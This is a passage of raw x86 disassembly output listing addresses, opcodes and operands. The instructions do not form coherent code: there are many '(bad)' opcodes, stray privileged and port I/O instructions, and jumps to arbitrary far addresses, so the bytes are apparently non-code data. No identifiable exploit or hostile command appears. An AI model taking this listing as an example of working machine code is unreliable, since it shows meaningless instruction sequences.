  420b6b:	xor    BYTE PTR [ebp-0x36],0x3b
  420b6f:	push   es
  420b70:	stos   DWORD PTR es:[edi],eax
  420b71:	nop
  420b72:	ficomp WORD PTR [ecx]
  420b74:	add    DWORD PTR [esi+0x7f],eax
  420b77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b78:	les    eax,FWORD PTR [edx]
  420b7a:	mov    al,0xa0
  420b7c:	test   al,0x9d
  420b7e:	lods   eax,DWORD PTR ds:[esi]
  420b7f:	imul   ebx,esp,0x91e87572
  420b85:	dec    cx
  420b87:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  420b89:	mov    edi,0x2a7598e7
  420b8e:	into   
  420b8f:	in     al,dx
  420b90:	das    
  420b91:	pop    edi
  420b92:	call   0x913080ad
  420b97:	add    ebx,DWORD PTR [ecx+0x4f383412]
  420b9d:	pop    esi
  420b9e:	enter  0xacfb,0x7
  420ba2:	jns    0x420b3b
  420ba4:	test   BYTE PTR [esi+0x1684aeff],0xe9
  420bab:	loope  0x420c09
  420bad:	ins    BYTE PTR es:[edi],dx
  420bae:	scas   al,BYTE PTR es:[edi]
  420baf:	jne    0x420b80
  420bb1:	mov    ds:0x80d208,al
	...
  420c16:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c1c:	mov    edx,0x5a65553f
  420c21:	stc    
  420c22:	dec    esi
  420c23:	push   ebp
  420c24:	(bad)
  420c27:	pop    ebx
  420c28:	add    DWORD PTR [eax],eax
  420c2a:	pop    es
  420c2b:	add    DWORD PTR [eax],eax
  420c2d:	add    BYTE PTR [esi+0x30],bl
  420c30:	jecxz  0x420bf5
  420c32:	push   cs
  420c33:	popa   
  420c34:	icebp  
  420c35:	rol    BYTE PTR [edx-0x4918eb68],0x54
  420c3c:	xor    eax,0xa4de5cfd
  420c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c42:	sbb    al,BYTE PTR [edi+edi*1+0x6fa29e83]
  420c49:	inc    ebx
  420c4a:	jbe    0x420c7f
  420c4c:	mov    al,ds:0x54a5f0f4
  420c51:	sbb    eax,0xce01b86b
  420c56:	jne    0x420c70
  420c58:	data16 fsubr DWORD PTR [esi+ebx*2]
  420c5c:	mov    ebp,0x25553a17
  420c61:	mov    DWORD PTR [ebx],ecx
  420c63:	cmp    DWORD PTR [eax+0x3753be1e],ecx
  420c69:	pop    ebp
  420c6a:	xchg   ecx,eax
  420c6b:	sub    BYTE PTR [eax+0x63],bl
  420c6e:	cmp    ebp,ebp
  420c70:	sub    eax,esp
  420c72:	add    al,0x2b
  420c74:	(bad)  
  420c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c77:	fst    QWORD PTR [edi+0xfdeff31]
  420c7d:	mov    ecx,0x8683a304
  420c82:	xchg   esp,eax
  420c83:	sbb    cl,BYTE PTR [ebx]
  420c85:	sub    DWORD PTR [esi+0x21ced729],ebx
  420c8b:	fldenv [edx+0x5]
  420c8e:	lods   eax,DWORD PTR ds:[esi]
  420c8f:	inc    ecx
  420c90:	xchg   esi,eax
  420c91:	cdq    
  420c92:	or     eax,0xce46f86e
  420c97:	cmp    dl,BYTE PTR [ecx-0x3f362bfe]
  420c9d:	outs   dx,BYTE PTR ds:[esi]
  420c9e:	jle    0x420c7d
  420ca0:	repz (bad) 
  420ca2:	nop
  420ca3:	hlt    
  420ca4:	(bad)  
  420ca5:	pop    eax
  420ca6:	mov    ds:0xc447acfd,al
  420cab:	sbb    DWORD PTR [ecx],0x26
  420cae:	rcl    DWORD PTR [edx+0x1b28960b],1
  420cb4:	retf   
  420cb5:	fcomp  st(3)
  420cb7:	mov    ds,WORD PTR [ebx+0x22]
  420cba:	push   esp
  420cbb:	jl     0x420cec
  420cbd:	sub    BYTE PTR [edx],ch
  420cbf:	add    DWORD PTR [ecx-0x3b2e7941],edi
  420cc5:	mov    dl,0x8f
  420cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cc8:	rcl    al,cl
  420cca:	rcr    BYTE PTR [eax],cl
  420ccc:	xor    al,0xd
  420cce:	ja     0x420cb0
  420cd0:	jae    0x420c7b
  420cd2:	mov    cl,0xe2
  420cd4:	xor    cl,BYTE PTR [ecx-0x1]
  420cd7:	add    al,0x2e
  420cd9:	adc    bl,dl
  420cdb:	inc    ecx
  420cdc:	outs   dx,BYTE PTR ds:[esi]
  420cdd:	fisttp WORD PTR [edi*1-0x1c3e6175]
  420ce4:	out    dx,eax
  420ce5:	xor    al,0xdc
  420ce7:	clc    
  420ce8:	ror    DWORD PTR [esi+0x3d39dcb],cl
  420cee:	mov    eax,ds:0xfb3249
  420cf3:	mov    BYTE PTR [edi-0x69592444],bl
  420cf9:	mov    al,0xe4
  420cfb:	pusha  
  420cfc:	xchg   edi,eax
  420cfd:	xchg   ebx,eax
  420cfe:	fidivr WORD PTR [eax]
  420d00:	aad    0x33
  420d02:	mov    ds:0xf608dc06,eax
  420d07:	daa    
  420d08:	xlat   BYTE PTR ds:[ebx]
  420d09:	fiadd  DWORD PTR [esi+0x7a]
  420d0c:	lods   al,BYTE PTR ds:[esi]
  420d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d0e:	push   edx
  420d0f:	jns    0x420d69
  420d11:	jecxz  0x420cf5
  420d13:	je     0x420d14
  420d15:	(bad)  
  420d16:	gs mov ebp,0x4954c371
  420d1c:	retf   
  420d1d:	stos   BYTE PTR es:[edi],al
  420d1e:	add    ecx,edi
  420d20:	leave  
  420d21:	adc    esi,DWORD PTR [ecx]
  420d23:	shr    BYTE PTR [edx+0x3858854e],0xaf
  420d2a:	shl    BYTE PTR [edx+ebx*8],cl
  420d2d:	mov    dh,ch
  420d2f:	inc    edi
  420d30:	mov    esi,0x8b57386
	...
  420d95:	add    bh,ah
  420d97:	push   ds
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0x6f0c1cea
  420da3:	and    ebx,esp
  420da5:	lahf   
  420da6:	mov    bl,0x5c
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    BYTE PTR ds:0x27f2f0e6,ch
  420db3:	out    dx,al
  420db4:	mov    ss,WORD PTR [edi]
  420db6:	jmp    0x7bc49630
  420dbb:	xchg   ecx,eax
  420dbd:	lods   al,BYTE PTR ds:[esi]
  420dbe:	and    al,0x68
  420dc0:	mov    eax,ds:0xcd72c1ed
  420dc5:	aaa    
  420dc6:	mov    ds:0xd2ec22f8,eax
  420dcb:	jmp    0x420e29
  420dcd:	loope  0x420e47
  420dcf:	cmp    ebp,DWORD PTR [ecx]
  420dd1:	(bad)  
  420dd2:	push   edi
  420dd3:	pushf  
  420dd4:	test   bl,bl
  420dd6:	lea    ebx,[edx+0x3f]
  420dd9:	fist   WORD PTR [ecx+esi*1]
  420ddc:	xchg   esp,eax
  420ddd:	inc    ebp
  420dde:	pushf  
  420ddf:	hlt    
  420de0:	adc    ebp,edx
  420de2:	sbb    edx,edx
  420de4:	pop    ss
  420de5:	mov    esi,DWORD PTR [ebx+ebx*4-0x1237aa75]
  420dec:	push   ebp
  420ded:	scas   eax,DWORD PTR es:[edi]
  420dee:	sbb    DWORD PTR [edi+0x2b],ebx
  420df1:	push   esi
  420df2:	(bad)  
  420df3:	cmc    
  420df4:	out    dx,al
  420df5:	jno    0x420e0c
  420df7:	icebp  
  420df8:	push   esp
  420df9:	outs   dx,BYTE PTR ds:[esi]
  420dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dfb:	inc    ebx
  420dfc:	test   al,0x45
  420dfe:	dec    edi
  420dff:	icebp  
  420e00:	add    esi,DWORD PTR [edx+0x16]
  420e03:	sbb    bl,ch
  420e05:	xchg   BYTE PTR [eax-0x34],dh
  420e08:	add    DWORD PTR fs:[ebx],ebp
  420e0b:	inc    edi
  420e0c:	repz fdivr DWORD PTR [esi]
  420e0f:	pusha  
  420e10:	cmc    
  420e11:	push   esi
  420e12:	daa    
  420e13:	(bad)  [edi-0x56]
  420e16:	fidivr WORD PTR [edi+0x4e84ba51]
  420e1c:	addr16 xchg ebp,eax
  420e1e:	jge    0x420e58
  420e20:	push   ebx
  420e21:	test   edx,ebx
  420e23:	and    bh,BYTE PTR [eax]
  420e25:	call   0x79b4a02f
  420e2a:	shl    BYTE PTR [ecx*1+0x8091ae],0xde
  420e32:	xor    DWORD PTR [ebp-0x7619f4fc],eax
  420e38:	leave  
  420e39:	push   edx
  420e3a:	xchg   ecx,eax
  420e3b:	and    eax,0xf6819c2
  420e40:	loop   0x420e1c
  420e42:	xchg   esp,eax
  420e43:	int3   
  420e44:	shl    DWORD PTR [ecx+0x57],0x9c
  420e48:	push   esp
  420e49:	stc    
  420e4a:	push   edx
  420e4b:	in     eax,0xc8
  420e4d:	in     eax,0x4e
  420e4f:	outs   dx,BYTE PTR ds:[esi]
  420e50:	pop    ebp
  420e51:	push   ebx
  420e52:	xor    ecx,DWORD PTR [edi-0x287b8e99]
  420e58:	leave  
  420e59:	xor    al,0x30
  420e5b:	xchg   ebp,eax
  420e5c:	data16 std 
  420e5e:	push   ebp
  420e5f:	enter  0x223a,0x4
  420e63:	mov    edx,0xe2f0253e
  420e68:	fdiv   DWORD PTR [eax+0x56]
  420e6b:	popa   
  420e6c:	mov    bh,0x9e
  420e6e:	mov    ecx,0xb0a15a3b
  420e73:	dec    edi
  420e74:	sbb    eax,0x6eb8bc9b
  420e79:	mov    ecx,0xf4932e22
  420e7e:	aad    0xf4
  420e80:	dec    ecx
  420e81:	out    dx,al
  420e82:	adc    ecx,DWORD PTR [esi+0x3244b6eb]
  420e88:	adc    al,0x99
  420e8a:	cwde   
  420e8b:	stos   BYTE PTR es:[edi],al
  420e8c:	adc    edx,edi
  420e8e:	fdiv   DWORD PTR [ebx+ebp*1+0x31]
  420e92:	or     esp,esp
  420e94:	sti    
  420e95:	adc    eax,0x1f43ec2
  420e9a:	dec    esi
  420e9b:	mov    eax,ds:0x94bc6dab
  420ea0:	popa   
  420ea1:	push   cs
  420ea2:	mov    dh,BYTE PTR [esp+ebp*4]
  420ea5:	jno    0x420e45
  420ea7:	dec    eax
  420ea8:	aas    
  420ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eaa:	sti    
  420eab:	mov    eax,ds:0x3677aa91
  420eb0:	mov    esi,0xaf80cb32
	...
  420f15:	add    BYTE PTR [eax],ah
  420f17:	xchg   edi,eax
  420f18:	inc    edx
  420f19:	shl    edi,cl
  420f1b:	xlat   BYTE PTR ds:[ebx]
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	ds iret 
  420f23:	leave  
  420f24:	call   0x700:0x15dbad2
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    BYTE PTR [esi-0x7a],dl
  420f30:	jp     0x420f35
  420f32:	jcxz   0x420fb2
  420f35:	adc    ch,BYTE PTR [eax]
  420f37:	fist   WORD PTR [ebx+0x1af30652]
  420f3d:	push   es
  420f3e:	add    al,dl
  420f40:	jle    0x420f37
  420f42:	dec    edx
  420f43:	or     eax,0xea35b57f
  420f48:	add    al,0x18
  420f4a:	int3   
  420f4b:	imul   esi,ebx,0xfffffff2
  420f4e:	aad    0x1
  420f50:	xchg   ebp,eax
  420f51:	xchg   DWORD PTR [ecx+0x5c],ecx
  420f54:	mov    DWORD PTR [esp+ecx*1],eax
  420f57:	mov    edx,0xcdcc38a8
  420f5c:	mov    eax,ds:0xe29b384c
  420f61:	ins    BYTE PTR es:[edi],dx
  420f62:	xchg   BYTE PTR [eax+eiz*1-0x13],bl
  420f66:	mov    ebx,0xed976b1c
  420f6b:	or     BYTE PTR [eax-0x68cccbb6],0xaf
  420f72:	and    eax,DWORD PTR [ebx+ebx*2]
  420f75:	inc    esp
  420f76:	loop   0x420fe9
  420f78:	dec    edi
  420f79:	xchg   ecx,eax
  420f7a:	in     eax,dx
  420f7b:	cmp    DWORD PTR [ecx+eax*1-0x37],ecx
  420f7f:	mov    esi,0x14b0bfc2
  420f84:	ret    
  420f85:	icebp  
  420f86:	inc    ebp
  420f87:	sub    ebx,DWORD PTR [ecx+0x4206bacc]
  420f8d:	lds    ebx,FWORD PTR [ebp+0x30e14376]
  420f93:	scas   al,BYTE PTR es:[edi]
  420f94:	mov    ecx,0xbade569
  420f99:	jbe    0x420f2c
  420f9b:	pop    edi
  420f9c:	xor    eax,0x79ac1ed0
  420fa1:	xor    eax,0xdd62dabd
  420fa6:	push   cs
  420fa7:	cmp    DWORD PTR [ecx+0x33],0xfe6465ae
  420fae:	add    DWORD PTR [ebx],edi
  420fb0:	jns    0x420f4f
  420fb2:	mov    eax,ds:0xd2282e9c
  420fb7:	mov    ch,0x21
  420fb9:	sbb    eax,0xaee1b724
  420fbe:	retf   0x8a5a
  420fc1:	add    ah,dh
  420fc3:	xchg   ebx,eax
  420fc4:	lock fild WORD PTR [edx+0x5c]
  420fc8:	lods   eax,DWORD PTR ds:[esi]
  420fc9:	fwait
  420fca:	push   ebx
  420fcb:	jae    0x42101a
  420fcd:	mov    bh,0xbb
  420fcf:	out    dx,al
  420fd0:	add    al,0xce
  420fd2:	pop    eax
  420fd3:	mov    ebp,ebp
  420fd5:	jecxz  0x420f8c
  420fd7:	pop    ecx
  420fd8:	retf   
  420fd9:	(bad)
  420fdd:	xor    al,0xef
  420fdf:	sbb    dh,ah
  420fe1:	xor    eax,DWORD PTR [edx-0x3aca510c]
  420fe7:	dec    esp
  420fe8:	fiadd  WORD PTR [ebx+0x2b42fefa]
  420fee:	or     al,0x72
  420ff0:	sbb    al,0x6f
  420ff2:	imul   eax,DWORD PTR [eax-0x7baf58ed],0xfffffff0
  420ff9:	xchg   edx,eax
  420ffa:	pop    esi
  420ffb:	xchg   BYTE PTR [edx],bh
  420ffd:	pop    es
  420ffe:	dec    ebp
  420fff:	mov    ebp,0x6b180803
  421004:	sbb    DWORD PTR [eax],0x8a35a78c
  42100a:	add    ebx,eax
  42100c:	and    dh,bh
  42100e:	aam    0xde
  421010:	repnz pop eax
  421012:	lahf   
  421013:	adc    al,0x69
  421015:	adc    eax,0x6d6602be
  42101a:	sub    al,0x44
  42101c:	std    
  42101d:	call   0x1b74:0x830ab399
  421024:	icebp  
  421025:	push   es
  421026:	xchg   ecx,eax
  421027:	sub    esi,DWORD PTR [eax-0x78]
  42102a:	push   cs
  42102b:	xor    al,0xa3
  42102d:	push   esp
  42102e:	scas   eax,DWORD PTR es:[edi]
  42102f:	xchg   edx,eax
  421030:	nop
  421031:	xor    eax,0x7dd293
	...
  421096:	lahf   
  421097:	pop    esi
  421098:	fcmovb st,st(6)
  42109a:	fcmovnb st,st(6)
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0xb58703fe
  4210a5:	push   eax
  4210a6:	rcr    DWORD PTR [esi+0x1],0x0
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [edi-0xf],bl
  4210b0:	and    esi,edi
  4210b2:	pop    edi
  4210b3:	push   ebx
  4210b4:	(bad)  
  4210b6:	call   0x63af:0x5c840887
  4210bd:	add    eax,0xbea9cdfb
  4210c2:	icebp  
  4210c3:	clc    
  4210c4:	mov    esi,0xc96ac8f0
  4210c9:	dec    esp
  4210ca:	retf   0x1436
  4210cd:	mov    ebp,0xb41384e
  4210d2:	xor    DWORD PTR [edx+ebx*2+0x6d],eax
  4210d6:	aad    0x8c
  4210d8:	out    dx,al
  4210d9:	or     edi,edx
  4210db:	mov    ecx,0x48b8ce7d
  4210e0:	dec    edx
  4210e1:	fldenv [esi+0x67]
  4210e4:	cmp    esp,DWORD PTR [ebx]
  4210e6:	add    ch,bh
  4210e8:	jne    0x421147
  4210ea:	and    eax,0xe6b1d250
  4210ef:	daa    
  4210f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210f1:	daa    
  4210f2:	push   eax
  4210f3:	cwde   
  4210f4:	push   es
  4210f5:	jb     0x421082
  4210f7:	dec    ecx
  4210f8:	mov    ebx,0xe0272e04
  4210fd:	pop    eax
  4210fe:	loopne 0x421081
  421100:	pop    ds
  421101:	add    edi,DWORD PTR [eax+0x594f3d2d]
  421107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421108:	pop    edi
  421109:	or     cl,dh
  42110b:	cmp    BYTE PTR [ebx],bh
  42110d:	push   ecx
  42110e:	(bad)  
  42110f:	jl     0x42113b
  421111:	cmp    al,0x76
  421113:	enter  0x9990,0xf8
  421117:	jmp    0xf38e:0xcc8a5659
  42111e:	mov    DWORD PTR [ebp+0x18a19b62],0xe55b1ec2
  421128:	lods   eax,DWORD PTR ds:[esi]
  421129:	pop    ebx
  42112a:	sub    esp,esi
  42112c:	adc    DWORD PTR [edi-0x789659f5],ebx
  421132:	and    ebx,DWORD PTR [ebx]
  421134:	inc    ebp
  421135:	lock fdiv DWORD PTR [edx+eiz*1+0x2c676488]
  42113d:	or     DWORD PTR [ebp-0x4a13840f],edi
  421143:	mov    dh,0xe6
  421145:	mov    al,BYTE PTR [edx]
  421147:	test   edi,ebp
  421149:	(bad)  
  42114a:	jno    0x4210eb
  42114c:	mov    dh,0x47
  42114e:	mov    bh,0xd6
  421150:	fsubr  st(7),st
  421152:	fnsetpm(287 only) 
  421154:	shl    DWORD PTR [edi-0x48],0xb4
  421158:	cwde   
  421159:	rcl    ch,1
  42115b:	(bad)  
  42115c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42115d:	outs   dx,DWORD PTR ds:[esi]
  42115e:	pop    ds
  42115f:	pop    ebx
  421160:	rol    ebp,1
  421162:	push   ebp
  421163:	mov    ds:0x3548047b,al
  421168:	or     eax,0xce5c2665
  42116d:	push   esp
  42116e:	jg     0x421198
  421170:	lods   al,BYTE PTR ds:[esi]
  421171:	pop    edi
  421172:	enter  0x734d,0xf4
  421176:	rol    WORD PTR [eax+ebx*2-0x15],cl
  42117b:	jns    0x42116a
  42117d:	and    DWORD PTR [edx],edx
  42117f:	or     ch,BYTE PTR [ebx-0xfd50d3b]
  421185:	and    DWORD PTR [esi],ebx
  421187:	or     edx,DWORD PTR [ebx+ebx*4]
  42118a:	sbb    al,0x7
  42118c:	sahf   
  42118d:	sbb    DWORD PTR [esi+ebx*1],edx
  421190:	sbb    eax,0x964c900e
  421195:	xchg   ebp,eax
  421196:	mov    dh,0x2
  421198:	sbb    al,0xb4
  42119a:	sub    al,0xf6
  42119c:	push   edi
  42119d:	jle    0x4211b1
  42119f:	xchg   BYTE PTR [esi],al
  4211a1:	mov    edi,0x94d8f150
  4211a6:	leave  
  4211a7:	aaa    
  4211a8:	outs   dx,BYTE PTR ds:[esi]
  4211a9:	xchg   edx,eax
  4211aa:	push   ebx
  4211ab:	call   FWORD PTR [ebx+0x6b904f6d]
  4211b1:	je     0x421162
  4211b3:	mov    bl,0xed
	...
  421215:	add    BYTE PTR [esi-0x700870e1],bl
  42121b:	idiv   esi
  42121d:	jg     0x421280
  42121f:	pop    es
  421220:	and    BYTE PTR [ecx-0x7f],cl
  421223:	mov    dh,0xaa
  421225:	adc    ecx,eax
  421227:	pop    edi
  421228:	add    DWORD PTR [eax],eax
  42122a:	pop    es
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    ch,bl
  42122f:	push   edx
  421230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421231:	pop    eax
  421232:	(bad)  
  421233:	pop    esp
  421234:	push   ss
  421235:	mov    eax,ds:0xd14c33f5
  42123a:	fwait
  42123b:	dec    edx
  42123c:	repnz add bl,BYTE PTR [edi+edi*1-0xc582148]
  421244:	rcl    BYTE PTR [ebx-0x2d],cl
  421247:	mov    esp,0x7328bc0a
  42124c:	test   al,0xf5
  42124e:	fdivr  st,st(6)
  421250:	inc    esp
  421251:	ja     0x421296
  421253:	push   ebx
  421254:	retf   
  421255:	sar    DWORD PTR [ebx+0x21],0xf4
  421259:	cmp    BYTE PTR [edx+0x51],0xba
  42125d:	out    dx,al
  42125e:	push   es
  42125f:	hlt    
  421260:	pop    esp
  421261:	shr    BYTE PTR [edi],0xb2
  421264:	xor    ecx,ebp
  421266:	retf   
  421267:	jmp    0x5096:0x33cfee88
  42126e:	jae    0x421239
  421270:	sub    esp,DWORD PTR gs:[edx+edx*1-0x2a]
  421275:	fdiv   QWORD PTR [edx]
  421277:	leave  
  421278:	cdq    
  421279:	es inc edx
  42127b:	mov    WORD PTR [edx],ss
  42127d:	mov    ebp,0x18aa11b
  421282:	(bad)  
  421283:	cld    
  421284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421285:	pop    edx
  421286:	add    ebx,ebx
  421288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421289:	pop    edi
  42128a:	loopne 0x421232
  42128c:	out    dx,eax
  42128d:	ins    BYTE PTR es:[edi],dx
  42128e:	pop    esi
  42128f:	sti    
  421290:	rcl    DWORD PTR [esi],0x88
  421293:	adc    eax,0x324e4904
  421298:	jg     0x42121b
  42129a:	xchg   BYTE PTR [eax-0x1c7294aa],al
  4212a0:	push   esi
  4212a1:	stos   DWORD PTR es:[edi],eax
  4212a2:	ja     0x421299
  4212a4:	call   DWORD PTR [edi]
  4212a6:	pop    ss
  4212a7:	in     eax,0x26
  4212a9:	outs   dx,BYTE PTR ds:[esi]
  4212aa:	jle    0x421287
  4212ac:	ret    0x7093
  4212af:	and    ah,dl
  4212b1:	ror    BYTE PTR [edi+0xb],cl
  4212b4:	retf   0x3f76
  4212b7:	arpl   WORD PTR [ebx],bp
  4212b9:	in     al,dx
  4212ba:	scas   al,BYTE PTR es:[edi]
  4212bb:	mov    ebp,0xa4bc965
  4212c0:	pop    edi
  4212c1:	push   cs
  4212c2:	popa   
  4212c3:	loopne 0x4212b4
  4212c5:	mov    WORD PTR [eax-0x68],cs
  4212c8:	enter  0x5785,0xd4
  4212cc:	mov    ebp,0x8fd4035a
  4212d1:	in     al,dx
  4212d2:	add    ecx,DWORD PTR [ecx+0x1a]
  4212d5:	jns    0x421309
  4212d7:	cdq    
  4212d8:	xchg   esp,eax
  4212d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212da:	scas   al,BYTE PTR es:[edi]
  4212db:	xchg   DWORD PTR [ebx],esp
  4212dd:	sub    DWORD PTR [ebx+ebx*4],0x6f
  4212e1:	imul   dl
  4212e3:	out    dx,eax
  4212e4:	outs   dx,DWORD PTR ds:[esi]
  4212e5:	or     cl,bl
  4212e7:	imul   edx,ebx,0xc5be7f8d
  4212ed:	pop    esi
  4212ee:	(bad)  [edi-0x1f]
  4212f1:	xlat   BYTE PTR ds:[ebx]
  4212f2:	mov    ah,0x7e
  4212f4:	mov    es,WORD PTR [edx+0x16]
  4212f7:	jl     0x42130c
  4212f9:	cdq    
  4212fa:	sbb    BYTE PTR [esi],0x57
  4212fd:	jo     0x42132b
  4212ff:	es fwait
  421301:	xchg   edx,eax
  421302:	out    0x30,al
  421304:	push   eax
  421305:	cmp    BYTE PTR [ebp+0x17552d4b],ah
  42130b:	rol    BYTE PTR [ecx-0x3b3ffc8f],cl
  421311:	out    dx,eax
  421312:	push   esp
  421313:	outs   dx,BYTE PTR ds:[esi]
  421314:	scas   al,BYTE PTR es:[edi]
  421315:	mov    eax,ds:0x32ad8655
  42131a:	jmp    0x53b7:0xbd86d668
  421321:	pop    ds
  421322:	mov    BYTE PTR [ebp-0x5b],al
  421325:	je     0x42136e
  421327:	cli    
  421328:	aad    0xb2
  42132a:	add    ebp,DWORD PTR [ebx+ebx*2+0x1e]
  42132e:	into   
  42132f:	(bad)  
  421330:	(bad)  
  421332:	ret    
  421333:	(bad)  
	...
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0xd26c04b0
  4213a3:	lahf   
  4213a4:	xchg   ebx,eax
  4213a5:	test   bh,0x60
  4213a8:	add    DWORD PTR [eax],eax
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [edx],ch
  4213af:	push   cs
  4213b0:	retf   
  4213b1:	lahf   
  4213b2:	cmp    BYTE PTR [eax],al
  4213b4:	pop    es
  4213b5:	lahf   
  4213b6:	int    0xbe
  4213b8:	test   BYTE PTR [ebx+0x6055c860],dl
  4213be:	shr    ah,1
  4213c0:	pop    edx
  4213c1:	in     eax,dx
  4213c2:	pop    ebx
  4213c3:	adc    edx,edi
  4213c5:	and    BYTE PTR [eax+0x23],bh
  4213c8:	mov    DWORD PTR [esi],ebx
  4213ca:	push   ss
  4213cb:	ret    
  4213cc:	dec    ebx
  4213cd:	mov    ebx,0x218ffec2
  4213d2:	ss adc bl,dh
  4213d5:	adc    eax,0x57b75c34
  4213da:	jo     0x4213d9
  4213dc:	or     BYTE PTR [ebp-0x6e168645],0x91
  4213e3:	je     0x421444
  4213e5:	add    cl,BYTE PTR [edx-0x67]
  4213e8:	gs push ebp
  4213ea:	repnz sbb al,0x3
  4213ed:	and    eax,0x1429aada
  4213f2:	adc    bl,ch
  4213f4:	or     DWORD PTR [ebp+0x62cbe6c2],esi
  4213fa:	push   ecx
  4213fb:	icebp  
  4213fc:	mov    cl,0xec
  4213fe:	mov    ds:0x5a9fcc55,eax
  421403:	mov    esi,0xe9d354e2
  421408:	mov    al,ds:0x8b796d49
  42140d:	(bad)  
  42140e:	pop    ebx
  42140f:	inc    esp
  421410:	mov    esi,0x5b90e2b1
  421415:	sahf   
  421416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421417:	(bad)  
  421419:	sbb    al,0xa
  42141b:	mov    ecx,0x442ec5e2
  421420:	sbb    edx,0xc68473eb
  421426:	or     dl,al
  421428:	xor    ecx,DWORD PTR [edi-0x1459dfe8]
  42142e:	int3   
  42142f:	dec    eax
  421430:	js     0x4213eb
  421432:	dec    esp
  421433:	inc    ebp
  421434:	icebp  
  421435:	jmp    0x4155:0xc65c4d65
  42143c:	mov    ebx,0x3f67c587
  421441:	cmp    ecx,0xeda6d032
  421447:	push   esi
  421448:	jle    0x4213ca
  42144a:	inc    esp
  42144b:	mov    ah,0x9f
  42144d:	pop    ebp
  42144e:	cmp    ebp,esi
  421450:	fsubp  st(3),st
  421452:	xchg   esi,eax
  421453:	pushf  
  421454:	and    al,BYTE PTR [edx]
  421456:	loop   0x421454
  421458:	adc    DWORD PTR [ebp-0x4],esp
  42145b:	or     ebp,edx
  42145d:	lahf   
  42145e:	or     DWORD PTR [edi+0x3a],0xffffffdb
  421462:	enter  0xc7c3,0x73
  421466:	push   cs
  421467:	pushf  
  421468:	pusha  
  421469:	mov    edi,0xb8fa69e5
  42146e:	das    
  42146f:	mov    edi,0x1efe9187
  421474:	hlt    
  421475:	xchg   edi,eax
  421476:	mov    esp,0xc51948eb
  42147b:	bound  edi,QWORD PTR [edi+0x4949de8]
  421481:	cld    
  421482:	mov    dl,0x5c
  421484:	mov    al,ds:0xba9352f6
  421489:	outs   dx,DWORD PTR ds:[esi]
  42148a:	cld    
  42148b:	mov    WORD PTR [ecx],es
  42148d:	imul   esp,ebp,0x33
  421490:	pop    ecx
  421491:	push   ds
  421492:	xor    BYTE PTR [esi+ebp*8+0xa],ah
  421496:	mov    dl,0x1a
  421498:	stos   BYTE PTR es:[edi],al
  421499:	jno    0x42141b
  42149b:	xor    al,0x38
  42149d:	jbe    0x421450
  42149f:	gs aaa 
  4214a1:	lods   eax,DWORD PTR ds:[esi]
  4214a2:	clc    
  4214a3:	push   ecx
  4214a4:	pusha  
  4214a5:	ins    DWORD PTR es:[edi],dx
  4214a6:	and    al,0xf6
  4214a8:	push   ebp
  4214a9:	ds mov dh,0xff
  4214ac:	sbb    eax,0x883bfe89
  4214b1:	dec    ebx
  4214b2:	mov    bh,0x37
  4214b4:	sbb    al,BYTE PTR [eax]
	...
  421516:	(bad)  
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	sbb    eax,0xd6b11f48
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    BYTE PTR [edi],dl
  42152f:	int    0x15
  421531:	push   es
  421532:	cld    
  421533:	dec    edi
  421534:	and    al,0xea
  421536:	mov    WORD PTR [esi+0x66],cs
  421539:	rol    edx,cl
  42153b:	sub    BYTE PTR [eax+edi*4-0x11],dl
  42153f:	cwde   
  421540:	cdq    
  421541:	xchg   BYTE PTR [ebx+0xa8c0b4],bh
  421547:	ins    BYTE PTR es:[edi],dx
  421548:	popa   
  421549:	daa    
  42154a:	pop    es
  42154b:	test   BYTE PTR ds:[eax],ch
  42154e:	push   eax
  42154f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421550:	iret   
  421551:	fidivr WORD PTR [edx+0x52f551bb]
  421557:	xor    DWORD PTR [edx],0x6121a020
  42155d:	ins    BYTE PTR es:[edi],dx
  42155e:	fbstp  TBYTE PTR [ebx-0x19]
  421561:	xor    bh,bh
  421563:	xor    eax,0x50682902
  421568:	(bad)  
  421569:	ja     0x421517
  42156b:	pop    esp
  42156c:	fcom   QWORD PTR [ebp+0x67]
  42156f:	add    BYTE PTR [edi-0xdb15bfc],0x8f
  421576:	(bad)  
  421577:	into   
  421578:	outs   dx,DWORD PTR ds:[esi]
  421579:	jmp    0x4215a9
